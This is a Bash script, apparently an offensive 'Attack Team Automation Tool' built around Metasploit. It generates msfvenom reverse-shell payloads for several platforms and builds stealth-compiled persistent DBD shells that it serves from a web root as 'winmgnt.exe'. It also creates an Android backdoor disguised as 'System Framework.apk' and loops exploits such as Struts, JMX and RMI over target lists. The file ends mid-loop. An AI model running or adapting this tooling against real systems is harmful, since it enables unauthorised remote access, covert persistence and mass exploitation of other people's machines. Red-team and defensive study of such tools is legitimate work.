#!/bin/bash
# ..................
[[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to start your ATAT"; exit 1; }
resize -s 30 60
clear                                   # Clear the screen.
SERVICE=service;
secs=$(date '+%S');

if ps ax | grep -v grep | grep postgresql > /dev/null
then
    echo "$SERVICE service running"
else
    echo "$SERVICE is not running, Starting service." 
    sudo service postgresql start
fi 
SERVICE1=service;
if ps ax | grep -v grep | grep metasploit > /dev/null
then
    echo "$SERVICE1 service running"
else
    echo "$SERVICE1 is not running, Starting service." 
    sudo service metasploit start
fi 
mkdir ~/Desktop/temp 
clear
clear
echo -e "\E[1;34m==========================================================="
echo -e "\E[1;34m============== \e[97mMetasploit services started \E[1;34m================"
echo -e "\E[1;34m:::::::::::::\e[97mScripts saved to ~/Desktop/temp/\E[1;34m::::::::::::::"
echo -e "\E[1;34m::::::::::::::::\e[97mPayloads saved to ~/ATAT/\E[1;34m::::::::::::::::::"
echo -e "\E[1;34m==========================================================="
read -p "Press [Enter] key to Continue..."
clear
echo -e "\E[1;34m======================== \e[97mAttack Team Automation Tool \E[1;34m======================="
if [ 0 -le $secs ] && [ $secs -le 14 ];
then
cat << "EOF"
     _________________________________
    |:::::::::::::;;::::::::::::::::::|
    |:::::::::::'~||~~~``:::::::::::::| 
    |::::::::'   .':     o`:::::::::::|          By |||3N1GmA|||
    |:::::::' oo | |o  o    ::::::::::| 
    |::::::: 8  .'.'    8 o  :::::::::|
    |::::::: 8  | |     8    :::::::::|
    |::::::: _._| |_,...8    :::::::::|
    |::::::'~--.   .--. `.   `::::::::|
    |:::::'     =8     ~  \ o ::::::::| "I Find Your Lack of Faith Disturbing"
    |::::'       8._ 88.   \ o::::::::|
    |:::'   __. ,.ooo~~.    \ o`::::::|
    |:::   . -. 88`78o/:     \  `:::::|        
    |::'     /. o o \ ::      \88`::::|       
    |:;     o|| 8 8 |d.        `8 `:::|       
    |:.       - ^ ^ -'           `-`::|       
    |::.                          .:::|       
    |:::::.....           ::'     ``::|      
    |::::::::-' -        88          `|       
    |:::::-'.          -       ::     |       
    |:-~. . .                   :     |      
    | .. .   ..:   o:8      88o       |       
    |. .     :::   8:P     d888. . .  |       
    |.   .   :88   88      888'  . .  |       
    |   o8  d88P . 88   ' d88P   ..   |       
    |  88P  888   d8P   ' 888         |      
    |   8  d88P.'d:8  .- dP~ o8       | 
    |      888   888    d~ o888       |
    |_________________________________|                          
EOF
elif [ 15 -le $secs ] && [ $secs -le 30 ];
then
cat << "EOF"
                  .?MMMMMMM8$@m-(".-.
                 (MMMMMMMMMMMMMMe(%e9ODA#%eRwC1%%?!-";
                MMMMMMMMMMMMMMMM*%JOMMMMMMMMMMM8M0DC?*%4?".
              .9MMMMMMMMMMMMMMMwe2#MMMMMMRC41%J#M&DC1D8&wM@*M&
             'MMMMMMMMMMMMM0@R9eemMMM#0##M9m**i(%???*i(|1#MRD2
             MMMMMMMMMMM@$449w2C!J%?C%"";"eCw$"|m==||;-`M.
           .MMMMMMMMMDO*i(((||(ii?*1?*%i"=(?mR  1%?(("%!
           mM@MM92e!';"i"?ii(ei;""""";";-(??.
          %MA!!?;"%"="i""mi'-1"""|""=;"""`&(
          .(4?"(=';;"""*9w|.-||(i%%|;`';;.;'
           *eJ;`%("((|i99C|.=|C=!1e;"w......     By ||3N1GmA||
           0m*"1|;"!*(&9me'.-1       M .`..R
           29*"M      -&C(..";       "i .'i%
           #C!%m      MRD"...J        M.;(|.
           @81!9     i&&2;...J=       1;!eiM
          '99*C8     9!"=''`.(%       $A&2"92
          'w=-(?     M%=`.`.e(        AMM*%!.
          CM("A     'OJ%.'.!e         #MMO1w%
          CMA"M.   .MMM%-;'*.         (MMMR0M
         %MMO!wD4 -MMM@%"|"M.        1MMMM8&DJ
         8O1DMMM0w"(!%(*1%"M*       .MM%?AOMMM.
        'R#MMMMMM!24mO91!("=J.      *MMwMMMMMMM
     =C@M0MM@Ae2MMMMMMMA1%"%J4|    %MMMMMMM0@&M?"
   (*M@MMR&&&2C#@#R&&&OC("'.&1='***MMMM#A8&AA1(=(
  ******%(MMMMM@M#OwmJw4A&&i.="2MMM8OwRwCCC1JmD&&$MD   Imperial AT-AT 
EOF
elif [ 31 -le $secs ] && [ $secs -le 45 ];
then
cat << "EOF"
                 ________
            _,.-Y  |  |  Y-._
        .-~"   ||  |  |  |   "-.
        I" ""=="|" !""! "|"[]""|     _____
        L__  [] |..------|:   _[----I" .-{"-.
       I___|  ..| l______|l_ [__L]_[I_/r(=}=-P
      [L______L_[________]______j~  '-=c_]/=-^
       \_I_j.--.\==I|I==_/.--L_]
         [_((==)[`-----"](==)j
            I--I"~~"""~~"I--I
            |[]|         |[]|        By |||3N1GmA|||
            l__j         l__j
            |!!|         |!!|
            |..|         |..|
            ([])         ([])
            ]--[         ]--[
            [_L]         [_L] 
           /|..|\       /|..|\
          `=}--{='     `=}--{='
         .-^--r-^-.   .-^--r-^-.             Imperial AT-AT
EOF
elif [ 46 -le $secs ] && [ $secs -le 57 ];
then
cat << "EOF"
               ._,.
           "..-..pf.
          -L   ..#'
        .+_L  ."]#
        ,'j' .+.j`                 -'.__..,.,p.
       _~ #..<..0.                 .J-.``..._f.
      .7..#_.. _f.                .....-..,`4'
      ;` ,#j.  T'      ..         ..J....,'.j`
     .` .."^.,-0.,,,,yMMMMM,.    ,-.J...+`.j@
    .'.`...' .yMMMMM0M@^=`""g.. .'..J..".'.jH
    j' .'1`  q'^)@@#"^".`"='BNg_...,]_)'...0-
   .T ...I. j"    .'..+,_.'3#MMM0MggCBf....F.
   j/.+'.{..+       `^~'-^~~""""'"""?'"``'1`
   .... .y.}                  `.._-:`_...jf
   g-.  .Lg'                 ..,..'-....,'.
  .'.   .Y^                  .....',].._f    By ||3N1GmA||
  ......-f.                 .-,,.,.-:--&`
                            .`...'..`_J`
                            .~......'#'
                            '..,,.,_]`    
                            .L..`..``. 
EOF
else
cat << "EOF"
     .    .     .            +         .         .                 .  .
      .                 .                   .               .
              .    ,,o         .                  __.o+.
    .            od8^                  .      oo888888P^b           .
       .       ,".o'      .     .             `b^'""`b -`b   .
             ,'.'o'             .   .          t. = -`b -`t.    .
            ; d o' .        ___          _.--.. 8  -  `b  =`b
        .  dooo8<       .o:':__;o.     ,;;o88%%8bb - = `b  =`b.    .
    .     |^88^88=. .,x88/::/ | \\`;;;;;;d%%%%%88%88888/%x88888
          :-88=88%%L8`%`|::|_>-<_||%;;%;8%%=;:::=%8;;\%%%%\8888
      .   |=88 88%%|HHHH|::| >-< |||;%;;8%%=;:::=%8;;;%%%%+|]88        .
          | 88-88%%LL.%.%b::Y_|_Y/%|;;;;`%8%%oo88%:o%.;;;;+|]88  .
          Yx88o88^^'"`^^%8boooood..-\H_Hd%P%%88%P^%%^'\;;;/%%88
         . `"\^\          ~"""""'      d%P """^" ;   = `+' - P
   .        `.`.b   .                :<%%>  .   :  -   d' - P      . .
              .`.b     .        .    `788      ,'-  = d' =.'
       .       ``.b.                           :..-  :'  P
            .   `q.>b         .               `^^^:::::,'       .
                  ""^^               .                     .
  .                                           .               .       .
    .         .          .                 .        +         .
EOF
fi 
tput sgr0                                       # 
echo -e "\e[31m_________________________[ \e[97mChoose Your Destiny \e[31m]________________________"
echo -e "\E[1;34m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "\E[1;34m===\e[97m[1] \e[90mPayload              \e[97m [Create MSFVenom Payload]  \E[1;34m"
tput sgr0                               # Reset colors to "normal."
echo -e "\E[1;34m:::\e[97m[2] \e[32mListen               \e[97m [Start a Listener]   \E[1;34m"
tput sgr0
echo -e "\E[1;34m===\e[97m[3] \e[34mMsfconsole           \e[97m [Drop into msfconsole]\E[1;34m"
tput sgr0
echo -e "\E[1;34m:::\e[97m[4] \e[95mPersistence          \e[97m [Create a Persistence Method] \E[1;34m"
tput sgr0
echo -e "\E[1;34m===\e[97m[5] \e[31mArmitage             \e[97m [Launch the Armitage GUI]  \E[1;34m"
tput sgr0
echo -e "\E[1;34m:::\e[97m[6] \e[90mMulti-Target Exploit \e[97m [Fire 1 Exploit at Many Targets]   \E[1;34m"
tput sgr0                               # Reset attributes.
echo -e "\E[1;34m===\e[97m[7] \e[32mMulti-Port Exploit   \e[97m [Fire 1 Exploit at 1 Target on many Ports]  \E[1;34m"
tput sgr0
echo -e "\E[1;34m:::\e[97m[8] \e[34mMulti-Port Auxiliary \e[97m [Run 1 Auxiliary Module Against Many Ports]  \E[1;34m"
tput sgr0
echo -e "\E[1;34m===\e[97m[9] \e[95mMulti-Target Struts \e[97m  [Fire 1 Struts Exploit at Many Targets]   \E[1;34m"
tput sgr0
echo -e "\E[1;34m:::\e[97m[10]\e[31mMulti-Target Java JMX \e[97m[Fire 1 JMX Exploit at Many Targets]   \E[1;34m"
tput sgr0
echo -e "\E[1;34m===\e[97m[11]\e[90mMulti-Target Java RMI \e[97m[Fire 1 RMI Exploit at Many Targets]   \E[1;34m"
tput sgr0
echo -e "\E[1;34m:::\e[97m[12]\e[32mMulti-Target SNMP Enum\e[97m[SNMP Enumerate Many Targets]   \E[1;34m"
tput sgr0
echo -e "\E[1;34m===\e[97m[13]\e[34mLoad Balance Detection\e[97m[Run LBD Against Many Targets]  \E[1;34m"
tput sgr0
echo -e "\E[1;34m:::\e[97m[14]\e[95mMulti-Target SSLScan \e[97m [Run SSLScan Against Many Targets]   \E[1;34m"
tput sgr0
echo -e "\E[1;34m===\e[97m[15]\e[31mMasscan All TCP Ports \e[97m[Masscan all TCP Ports on Targets]   \E[1;34m"
tput sgr0
echo -e "\E[1;34m:::\e[97m[16]\e[90mDependency Checker    \e[97m[Check For Dependencies]   \E[1;34m"
tput sgr0
echo -e "\E[1;34m::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e "\e[97m~~~~~~~~~~~~~~~~~~ \e[31mProps to rand0m1ze for the concept!\e[97m~~~~~~~~~~~~~~~~~~\e[31m"
tput sgr0


read options

case "$options" in
# Note variable is quoted.

  "1" | "1" )
  # Accept upper or lowercase input.
  echo -e "\E[1;34m::::: \e[97mChoose Your Weapon\E[1;34m:::::"

PS3='Enter your choice 8=QUIT: '
options=("Windows" "Linux" "Mac" "Android" "List_All" "Custom" "All The Payloads" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Windows")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p windows/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f exe > ~/Desktop/temp/shell.exe
            echo -e "\E[1;34m::::: \e[97mshell.exe saved to ~/ATAT/\E[1;34m:::::"
            ;;
        "Linux")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport -f elf > ~/Desktop/temp/shell.elf
            echo -e "\E[1;34m::::: \e[97mshell.elf saved to ~/ATAT/\E[1;34m:::::"
            ;;
        "Mac")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p osx/x86/shell_reverse_tcp LHOST=$uservar LPORT=$userport -f macho > ~/Desktop/temp/shell.macho
            echo -e "\E[1;34m::::: \e[97mshell.macho saved to ~/ATAT/\E[1;34m:::::"
            ;;
        "Android")
            read -p 'Set LHOST IP: ' uservar; read -p 'Set LPORT: ' userport
            msfvenom -p android/meterpreter/reverse_tcp LHOST=$uservar LPORT=$userport R > ~/Desktop/temp/shell.apk
            echo -e "\E[1;34m::::: \e[97mshell.apk saved to ~/ATAT/\E[1;34m:::::"
            ;;  
        "Custom")
cat << "EOF"
<TYPE>:
   + APK
   + ASP
   + ASPX
   + Bash [.sh]
   + Java [.jsp]
   + Linux [.elf]
   + OSX [.macho]
   + Perl [.pl]
   + PHP
   + Powershell [.ps1]
   + Python [.py]
   + Tomcat [.war]
   + Windows [.exe // .dll]

 Rather than putting <DOMAIN/IP>, you can input an interface and ATAT will detect that IP address. 
EOF
            read -p 'Set DOMAIN/IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set TYPE: ' usertype; read -p 'Select CMD/MSF: ' usershell; read -p 'Set BIND/REVERSE: ' userbindrev; read -p 'Set STAGED/STAGELESS: ' userstage; read -p 'Select TCP/HTTP/HTTPS/FIND_PORT: ' userprotocol; read -p 'Select BATCH/LOOP (optional): ' usermode
            /usr/bin/msfpc $usertype $userhost $userport $usershell $userbindrev $userstage $userprotocol $usermode verbose
            echo -e "\E[1;34m::::: \e[97mPayload & RC File Saved to ~/ATAT/\E[1;34m:::::"
            ;;
        "All The Payloads")
            read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport
            /usr/bin/msfpc verbose loop $userhost $userport
            echo -e "\E[1;34m::::: \e[97mPayloads & RC Files Saved to ~/ATAT/\E[1;34m:::::"
            ;;
        "List_All")
            rm msfvenom_payloads.txt
            msfvenom -l | tee msfvenom_payloads.txt
            echo -e "\E[1;34m::::: \e[97mmsfvenom_payloads.txt Saved to ~/ATAT/\E[1;34m:::::"
            ;;   
        "Quit")
            echo "Aufiederszehn" && break
            ;;
        *) echo invalid option;;
    esac
done
 ;;

  "2" | "2" )
echo -e "\E[1;34m::::: \e[97mCreate a Listener\E[1;34m:::::"

PS3='Enter your choice 2=QUIT: '
options=("Options" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Options")
        read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set PAYLOAD: ' userpayload
            touch ~/Desktop/temp/meterpreter.rc
            echo use exploit/multi/handler > ~/Desktop/temp/meterpreter.rc
            echo set PAYLOAD $userpayload >> ~/Desktop/temp/meterpreter.rc
            echo set LHOST $userhost >> ~/Desktop/temp/meterpreter.rc
            echo set LPORT $userport >> ~/Desktop/temp/meterpreter.rc
            echo set ExitOnSession false >> ~/Desktop/temp/meterpreter.rc
            echo set AutoRunScript post/multi/gather/multi_command RESOURCE=/root/ATAT/postex.rc >> ~/Desktop/temp/meterpreter.rc
            echo exploit -j >> ~/Desktop/temp/meterpreter.rc
            cat ~/Desktop/temp/meterpreter.rc
            xterm -e msfconsole -r ~/Desktop/temp/meterpreter.rc &
            ;;
        "Quit")
            echo "Aufiederszehn" && break
            ;;
        *) echo invalid option;;
    esac
done
;;

  "3" | "3" )
  # Accept upper or lowercase input.
  echo -e "\E[1;34m::::: \e[97mStarting Metasploit \E[1;34m:::::"
  msfconsole

;;

  "4" | "4" )
# Accept upper or lowercase input.
echo -e "\E[1;34m::::: \e[97mPersistence Generator \E[1;34m:::::"
echo -e "\E[1;34m::::: \e[97mThanks to Skysploit for the DBD Builder!! \E[1;34m:::::"
PS3='Enter your choice 6=QUIT: '
options=("Windows DBD Reverse Shell" "Windows DBD Bind Shell (Work In Progress)" "Linux/NetBSD/FreeBSD/OpenBSD DBD Reverse Shell" "Linux/NetBSD/FreeBSD/OpenBSD DBD Bind Shell" "Android" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Windows DBD Reverse Shell")
		clear
		read -p "Where shall I send your persistent shell? " attackerip
		echo ""
		read -p "What port will you be listening on? " attackerport
		echo ""
		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
		echo ""
		echo -e "\e[1;34mGenerating your payload...\e[0m"
		echo ""
		sed "/HOST/s/attackerip/$attackerip/g" ~/ATAT/misc/dbd/conf/dbd_win_reverse.conf > ~/ATAT/misc/dbd/dbd_win_reverse1.conf
		sed "/PORT/s/attackerport/$attackerport/g" ~/ATAT/misc/dbd/dbd_win_reverse1.conf > ~/ATAT/misc/dbd/dbd_win_reverse2.conf
		sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" ~/ATAT/misc/dbd/dbd_win_reverse2.conf > ~/ATAT/misc/dbd/dbd.h
		rm ~/ATAT/misc/dbd/dbd_win_reverse1.conf
		rm ~/ATAT/misc/dbd/dbd_win_reverse2.conf
		cd ~/ATAT/misc/dbd/
		make mingw-cross CFLAGS=-DSTEALTH
		cp ~/ATAT/misc/dbd/dbd.exe /var/www/html/winmgnt.exe
		clear
		#rm dbd.exe
		cd ~/ATAT
		echo -e "\e[1;34mDone! Your payload is located at /var/www/html/winmgnt.exe\e[0m"
		echo ""
		
		read -p "Would you like me to launch a listener [y|n]? " listener
		echo ""
		
			if [ "$listener" == "y" ]; then
				x-terminal-emulator -e dbd -lvp $attackerport -k $attackersecret &
				read -p "Press any key to contiue" enter
				clear				
			else
				echo -e "\e[1;34mWhen you are ready to receive your shell in your terminal enter:\e[0m"
				echo "dbd -lvp $attackerport -k $attackersecret"
				echo ""
				read -p "Press any key to contiue" enter
				clear
			fi
            ;;
       "Windows DBD Bind Shell (Work In Progress)")
        read -p "What port would you like the victim be listening on? " attackerport
		echo ""
		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
		echo ""
		echo -e "\e[1;34mGenerating your payload...\e[0m"
		echo ""
		sleep 3
		sed "/PORT/s/attackerport/$attackerport/g" ~/ATAT/misc/dbd/conf/dbd_win_bind.conf > ~/ATAT/misc/dbd/dbd_win_bind1.conf
		sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" ~/ATAT/misc/dbd/dbd_win_bind1.conf > ~/ATAT/misc/dbd/dbd.h
		rm ~/ATAT/misc/dbd/dbd_win_bind1.conf
		cd ~/ATAT/misc/dbd/
		make mingw-cross CFLAGS=-DSTEALTH
		cp ~/ATAT/misc/dbd/dbd.exe /var/www/html/winmgnt.exe
		clear
		#rm dbd.exe
		cd ~/ATAT
		echo -e "\e[1;34mDone! Your payload is located at /var/www/html/winmgnt.exe\e[0m"
		echo ""
		echo -e "\e[1;34mWhen you are ready to connect to the victim, in your terminal enter:\e[0m"
		echo "dbd -nv victim.host.orip -p $attackerport -k $attackersecret"
		echo ""
		read -p "Press any key to contiue" enter
		clear
            ;;
        "Linux/NetBSD/FreeBSD/OpenBSD DBD Reverse Shell")	
		clear
		read -p "Where shall I send your persistent shell? " attackerip
		echo ""
		read -p "What port will you be listening on? " attackerport
		echo ""
		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
		echo ""
		echo -e "\e[1;34mGenerating your payload...\e[0m"
		echo ""
		sleep 3
		sed "/HOST/s/attackerip/$attackerip/g" ~/ATAT/misc/dbd/conf/dbd_unix_reverse.conf > ~/ATAT/misc/dbd/dbd_unix_reverse1.conf
		sed "/PORT/s/attackerport/$attackerport/g" ~/ATAT/misc/dbd/dbd_unix_reverse1.conf > ~/ATAT/misc/dbd/dbd_unix_reverse2.conf
		sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" ~/ATAT/misc/dbd/dbd_unix_reverse2.conf > ~/ATAT/misc/dbd/dbd.h
		rm ~/ATAT/misc/dbd/dbd_unix_reverse1.conf
		rm ~/ATAT/misc/dbd/dbd_unix_reverse2.conf
		cd ~/ATAT/misc/dbd/
		make unix
		chmod +x dbd
		cp ~/ATAT/misc/dbd/dbd /var/www/html
		#rm dbd
		#clear
		cd ~/ATAT
		echo -e "\e[1;34mDone! Your payload is located at /var/www/html...\e[0m"
		echo ""
		
		read -p "Would you like me to launch a listener [y|n]? " listener
		echo ""
		
			if [ "$listener" == "y" ]; then
				x-terminal-emulator -e dbd -lvp $attackerport -k $attackersecret &
				read -p "Press any key to contiue" enter
				clear
			else
				echo -e "\e[1;34mWhen you are ready to receive your shell in your terminal enter:\e[0m"
				echo "dbd -lvp $attackerport -k $attackersecret"
				echo ""
				read -p "Press any key to contiue" enter
				clear
			fi
			;;
		"Linux/NetBSD/FreeBSD/OpenBSD DBD Bind Shell")
		clear
		read -p "What port would you like the victim be listening on? " attackerport
		echo ""
		read -p "What would you like the shared secret to be on your secure connection? " attackersecret
		echo ""
		echo -e "\e[1;34mGenerating your payload...\e[0m"
		echo ""
		sleep 3
		sed "/HOST/s/attackerport/$attackerport/g" ~/ATAT/misc/dbd/conf/dbd_unix_bind.conf > ~/ATAT/misc/dbd/dbd_unix_bind1.conf
		sed "/SHARED_SECRET/s/attackersecret/$attackersecret/g" ~/ATAT/misc/dbd/dbd_unix_bind1.conf > ~/ATAT/misc/dbd/dbd.h
		rm ~/ATAT/misc/dbd/dbd_unix_bind1.conf
		cd ~/ATAT/misc/dbd/
		make unix
		chmod +x dbd
		cp ~/ATAT/misc/dbd/dbd /var/www/html
		#rm dbd
		clear
		cd ~/ATAT
		echo -e "\e[1;34mDone! Your payload is located at /var/www/html...\e[0m"
		echo ""
		echo -e "\e[1;34mWhen you are ready to connect to the victim, in your terminal enter:\e[0m"
		echo "dbd -nv victim.host.orip -p $attackerport -k $attackersecret"
		echo ""
		read -p "Press any key to contiue" enter
		clear
	        ;;
        "Android")
        read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport;
			msfvenom -f raw -p android/meterpreter/reverse_https LHOST=$userhost LPORT=$userport -o "System Framework.jar"
			cp "System Framework.jar" "System Framework.apk"
			rm "System Framework.jar"
			echo -e "\E[1;34m::::: \e[97mSystem Framework.apk saved to ~/ATAT. Upload to device, install, and run.\E[1;34m:::::" 
			echo -e "\E[1;34m::::: \e[97mStart an android/meterpreter/reverse_https listener\E[1;34m:::::" 
            ;; 
        "Quit")
            echo "Aufiederszehn" && break
            ;;
        *) echo invalid option;;
    esac
done
;;

  "5" | "5" )
  # 
  echo -e "\E[1;34m::::: \e[97mArmitage Launcher \E[1;34m:::::"
  echo "armitage should be in /opt/armitage"
  echo -e "\E[1;34m::::: \e[97mLaunching...\E[1;34m:::::"
  armitage 

;;

 "6" | "6" )
         
 echo -e "\E[1;34m::::: \e[97mExploit All The Things!!\E[1;34m:::::"
 echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!!\E[1;34m:::::"
 
PS3='Enter your choice 2=QUIT: '
options=("Options" "Quit") # "Linux" "Mac" "Android" "List_All" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Options")
            read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set RPORT: ' targetport; read -p 'Set EXPLOIT_PATH: ' userexploit; read -p 'Set PAYLOAD: ' userpayload;
	inputfile=~/ATAT/MSF_targets.txt
	for IP in $(cat $inputfile)
	do
	msfconsole -x "use $userexploit;\
	set LHOST $userhost;\
	set LPORT $userport;\
	set RHOST $IP;\
	set RPORT $targetport;\
	set PAYLOAD $userpayload;\
	set DisablePayloadHandler true;\
	run;\
	exit"
	done
            echo -e "\E[1;34m::::: \e[97mAll Targets Have Been Tested! Check Your Listener for Sessions!\E[1;34m:::::"
            ;;
        "Quit")
            echo "Aufiederszehn" && break
            ;;
        *) echo invalid option;;
    esac
done 
  
;;

 "7" | "7" )
         
echo -e "\E[1;34m::::: \e[97mExploit All The Ports!!\E[1;34m:::::"
echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!!\E[1;34m:::::"

PS3='Enter your choice 2=QUIT: '
options=("Options" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Options")
            read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set EXPLOIT_PATH: ' userexploit; read -p 'Set PAYLOAD: ' userpayload; read -p 'Set RHOST: ' usertarget;
	inputfile=~/ATAT/MSF_target_ports.txt

	for PORT in $(cat $inputfile)
	do
	msfconsole -x "use $userexploit;\
	set LHOST $userhost;\
	set LPORT $userport;\
	set RHOST $usertarget;\
	set RPORT $PORT;\
	set PAYLOAD $userpayload;\
	set DisablePayloadHandler true;\
	run;\
	exit"
	done
            echo -e "\E[1;34m::::: \e[97mAll Targets Have Been Tested! Check Your Listener for Sessions!\E[1;34m:::::"
            ;;
        
        "Quit")
            echo "Aufiederszehn" && break
            ;;
        *) echo invalid option;;
    esac
done
;;
  
   "8" | "8" )
          
echo -e "\E[1;34m::::: \e[97mScan All The Things!!\E[1;34m:::::"

PS3='Enter your choice 2=QUIT: '
options=("Options" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Options")
            read -p 'Set MODULE_PATH: ' usermodule; read -p 'Set RHOSTS: ' usertarget;
	inputfile=~/ATAT/MSF_AUX_target_ports.txt

	for PORT in $(cat $inputfile)
	do
	msfconsole -x "use $usermodule;\
	set RHOSTS $usertarget;\
	set RPORT $PORT;\
	run;\
	exit"
	done
            echo -e "\E[1;34m::::: \e[97mAll Targets Have Been Scanned\E[1;34m:::::"
            ;;
        "Quit")
            echo "Aufiederszehn" && break
            ;;
        *) echo invalid option;;
    esac
done
   
;;
 
 "9" | "9" )
         
 echo -e "\E[1;34m::::: \e[97mExploit All The Struts!!\E[1;34m:::::"
 echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!!\E[1;34m:::::"
 
PS3='Enter your choice 2=QUIT: '
options=("Options" "Quit") # "Linux" "Mac" "Android" "List_All" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Options")
            read -p 'Set LHOST IP: ' userhost; read -p 'Set Attacker_Server_PORT: ' srvport; read -p 'Set RPORT: ' userport; read -p 'Set EXPLOIT_PATH: ' userexploit; read -p 'Set PAYLOAD: ' userpayload; read -p 'Set TARGETURI: ' useruri;
	inputfile=~/ATAT/MSF_targets.txt
	for IP in $(cat $inputfile)
	do
	msfconsole -x "use $userexploit;\
	set LHOST $userhost;\
	set SRVPORT $srvport;\
	set RPORT $userport;\
	set RHOST $IP;\
	set PAYLOAD $userpayload;\
	set TARGETURI $useruri;\
	set DisablePayloadHandler true;\
	run;\
	exit"
	done
            echo -e "\E[1;34m::::: \e[97mAll Struts Targets Have Been Tested! Check Your Listener for Sessions!\E[1;34m:::::"
            ;;
        "Quit")
            echo "Aufiederszehn" && break
            ;;
        *) echo invalid option;;
    esac
done 
  
;;
  
 "10" | "10" )
         
 echo -e "\E[1;34m::::: \e[97mExploit All The Java JMX!!\E[1;34m:::::"
 echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!!\E[1;34m:::::"
 
PS3='Enter your choice 2=QUIT: '
options=("Options" "Quit") # "Linux" "Mac" "Android" "List_All" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Options")
            read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set Attacker_Server_PORT: ' srvport; read -p 'Set RPORT: ' targetport; read -p 'Set PAYLOAD: ' userpayload; read -p 'Set JMXRMI: ' userjmxrmi;
	inputfile=~/ATAT/MSF_targets.txt
	for IP in $(cat $inputfile)
	do
	msfconsole -x "use exploit/multi/misc/java_jmx_server;\
	set LHOST $userhost;\
	set LPORT $userport;\
	set SRVPORT $srvport;\
	set RPORT $targetport;\
	set RHOST $IP;\
	set PAYLOAD $userpayload;\
	set JMXRMI $userjmxrmi;\
	set DisablePayloadHandler true;\
	run;\
	exit"
	done
            echo -e "\E[1;34m::::: \e[97mAll Java JMX Targets Have Been Tested! Check Your Listener for Sessions!\E[1;34m:::::"
            ;;
        "Quit")
            echo "Aufiederszehn" && break
            ;;
        *) echo invalid option;;
    esac
done 
  
;;  

 "11" | "11" )
         
 echo -e "\E[1;34m::::: \e[97mExploit All The Java RMI!!\E[1;34m:::::"
 echo -e "\E[1;34m::::: \e[97mDO NOT FORGET TO START YOUR APPROPRIATE LISTENER!!\E[1;34m:::::"
 
PS3='Enter your choice 2=QUIT: '
options=("Options" "Quit") # "Linux" "Mac" "Android" "List_All" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Options")
            read -p 'Set LHOST IP: ' userhost; read -p 'Set LPORT: ' userport; read -p 'Set Attacker_Server_PORT: ' srvport; read -p 'Set RPORT: ' targetport; read -p 'Set PAYLOAD: ' userpayload; read -p 'Set HTTPDELAY: (default 10) ' userdelay;
	inputfile=~/ATAT/MSF_targets.txt
	for IP in $(cat $inputfile)
	do
	msfconsole -x "use exploit/multi/misc/java_rmi_server;\
	set LHOST $userhost;\
	set LPORT $userport;\
	set SRVPORT $srvport;\
	set RPORT $targetport;\
	set RHOST $IP;\
	set PAYLOAD $userpayload;\
	set HTTPDELAY $userdelay;\
	set DisablePayloadHandler true;\
	run;\
	exit"
	done
            echo -e "\E[1;34m::::: \e[97mAll Java RMI Targets Have Been Tested! Check Your Listener for Sessions!\E[1;34m:::::"
            ;;
        "Quit")
            echo "Aufiederszehn" && break
            ;;
        *) echo invalid option;;
    esac
done 
  
;;  

 "12" | "12" )
         
 echo -e "\E[1;34m::::: \e[97mExploit All The SNMP!!\E[1;34m:::::"
 
PS3='Enter your choice 2=QUIT: '
options=("Options" "Quit") # "Linux" "Mac" "Android" "List_All" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Options")
            read -p 'Set RPORT (default=161): ' targetport; read -p 'Set Community String (default=public): ' userstring; read -p 'Set SNMP Version (default=1): ' userversion;
	inputfile=~/ATAT/MSF_targets.txt
	for IP in $(cat $inputfile)
	do
	msfconsole -x "use auxiliary/scanner/snmp/snmp_enum;\
	set RPORT $targetport;\
	set RHOSTS $IP;\
	set COMMUNITY $userstring;\
	set VERSION $userversion;\
	run;\
	exit"
	done
            echo -e "\E[1;34m::::: \e[97mAll Targets' SNMP Have Been Enumerated!\E[1;34m:::::"
            ;;
        "Quit")
            echo "Aufiederszehn" && break
            ;;
        *) echo invalid option;;
    esac
done 
  
;;  

 "13" | "13" )
         
 echo -e "\E[1;34m::::: \e[97mMulti Target Load Balancer Detection\E[1;34m:::::"
 
PS3='Enter your choice 2=QUIT: '
options=("Run" "Quit") # "Linux" "Mac" "Android" "List_All" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Run")
			
	inputfile=~/ATAT/MSF_targets.txt
	outputfile=~LBD_Results_temp.txt
	for IP in $(cat $inputfile)
	do
